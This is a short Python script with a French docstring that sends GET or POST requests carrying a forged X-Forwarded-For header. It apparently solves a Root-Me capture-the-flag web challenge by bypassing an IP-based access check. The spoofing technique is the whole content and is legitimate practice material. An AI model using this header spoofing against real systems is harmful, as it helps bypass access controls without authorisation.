"""
Script pour faire une requete get ou post en spoofant une ip

"""
import requests

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",

}


def spoof_ip_request(url, ip_spoofed,post_r=False, data={}):
    headers["X-Forwarded-For"] = ip_spoofed
    if post_r:
        r = requests.post(url, headers=headers, data=data)
    else:
        r = requests.get(url, headers=headers)
    return r.content


if __name__ == "__main__":
    url = 'http://challenge01.root-me.org/web-serveur/ch68/'
    ip_spoofed = "192.168.1.1"
    print(spoof_ip_request(url, ip_spoofed).decode())
